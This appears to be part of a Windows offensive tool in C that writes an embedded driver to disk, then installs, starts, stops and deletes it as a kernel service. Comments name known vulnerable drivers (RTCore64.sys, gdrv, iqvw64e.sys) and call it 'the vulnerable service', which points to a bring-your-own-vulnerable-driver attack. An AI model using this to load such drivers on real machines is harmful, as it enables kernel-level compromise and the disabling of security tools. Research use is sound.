/**
 * Drop the included service binary to disk.
 * 
 * @param wchar_t* servicePath The file path to write the service binary file to.
 * @return bool Positive if it was succesfully written.
 */
BOOL dropServiceBinary(wchar_t* driverPath, char* driverFile,int driverFileSize) {
    HANDLE hFile = CreateFileW(driverPath, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        PRINT("[-] Cannot open given file handle: %S.\n", driverPath);
        return false;
    } else {
        PRINT("[+] Opened file handle to: %S.\n", driverPath);
    }

	// driverFile and driverFileSize are global variables.
    if(!WriteFile(hFile, driverFile, driverFileSize, NULL, NULL)) {
        PRINT("Cannot write to file handle: %S.\n", driverPath);
        return false;
    }

    PRINT("[+] Wrote driver as file: %S\n", driverPath);

    CloseHandle(hFile);
    return true;
}

/**
 * Delete the dropped service binary from disk.
 * 
 * @param wchar_t* servicePath The file path to delete the service binary file from.
 * @return bool Positive if it was succesfully deleted.
 */
BOOL deleteServiceBinary(wchar_t* driverPath) {
    // Somehow using `DeleteFileW` with the wide char path does not work.
    // Thus we convert the wide char path to a char path and delete the file using `DeleteFile`.
    char* driverPathChar = (char *)calloc(wcslen(driverPath), sizeof(uint8_t));  // uint8_t equivalent?
    wcstombs(driverPathChar, driverPath,wcslen(driverPath));

    if(!DeleteFileA((LPCSTR)driverPathChar)) {
        PRINT("[-] Cannot delete the file: %S, error %d.\n", driverPath, GetLastError());
        return false;
    }

    return true;
}


/**
 * Stop the given service and it's binary.
 * 
 * @param wchar_t* serviceName The name of the service to stop.
 * @return bool Positive if it is deleted.
 */
BOOL deleteService(wchar_t* serviceName) {
    // Establishes a connection to the service control manager.
    SC_HANDLE hServiceManager;
    if (!(hServiceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT))) {
        PRINT("[-] Cannot open handle to the service manager.");
        return false;
    }

    // Open service (if possible)
    SC_HANDLE hService = OpenServiceW(hServiceManager, serviceName, SERVICE_STOP | DELETE);
    if (hService == NULL) {
        PRINT("[-] Service not installed: %d.", GetLastError());
        CloseServiceHandle(hServiceManager);
        return false;
    }

    // Stop the service
    SERVICE_STATUS serviceStatus;
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        PRINT("[-] Could not stop service: %d, %d.\n", GetLastError(), serviceStatus);
        CloseServiceHandle(hService);
        CloseServiceHandle(hServiceManager);
        return false;
    }

    // Delete the service
    if (!DeleteService(hService)) {
        PRINT("[-] Could not delete service: %d.\n", GetLastError());
        CloseServiceHandle(hService);
        CloseServiceHandle(hServiceManager);
        return false;
    }

	PRINT("[+] Successfully deleted the service!\n");

    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);
    return true;
}


/**
 * Install a service with the given name, description and binary path. - The service is then registered in the SCM’s database
 * 
 * @param wchar_t* serviceName The name of the service to install.
 * @param wchar_t* serviceDescription A description of what the service does.
 * @param wchar_t* driverPath A file path to the service binary to install.
 * @return bool Positive if it is installed.
 
// Create services (as admin) or use Win API:
// sc create rtc type= kernel binPath= z:\MDA2\drivers\RTCore64.sys
// sc create gdrv type= kernel binPath= z:\MDA2\drivers\gdriver.sys
// sc create int type= kernel binPath= z:\MDA2\drivers\iqvw64e.sys
 */
bool installService(wchar_t* serviceName, wchar_t* serviceDescription, wchar_t* driverPath) {
// Create services (as admin) or use Win API:
// sc create rtc type= kernel binPath= z:\MDA2\drivers\RTCore64.sys
    // Establishes a connection to the service control manager.
    SC_HANDLE hServiceManager;
    if (!(hServiceManager = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE))) {
        PRINT("[-] Cannot open handle to the service manager.\n");
        return false;
    }

    // Open stopped service or create new service
    SC_HANDLE hService = OpenServiceW(hServiceManager, serviceName, SERVICE_START);
    if (!hService) {
        if (!(hService = CreateServiceW(hServiceManager, serviceName, serviceDescription, READ_CONTROL | WRITE_DAC | SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL))) {
            PRINT("[-] Could not install the vulnerable service: %d.\n", GetLastError());
            CloseServiceHandle(hServiceManager);
            return false;
        }
    }

    // Start the installed service
    if (!StartServiceW(hService, 0, NULL)) {
        if (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
            PRINT("[-] Could not start the vulnerable service: %d.\n", GetLastError());
            CloseServiceHandle(hService);
            CloseServiceHandle(hServiceManager);
            return false;
        }
    }

    // Close existing connections
    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);

    return true;
}
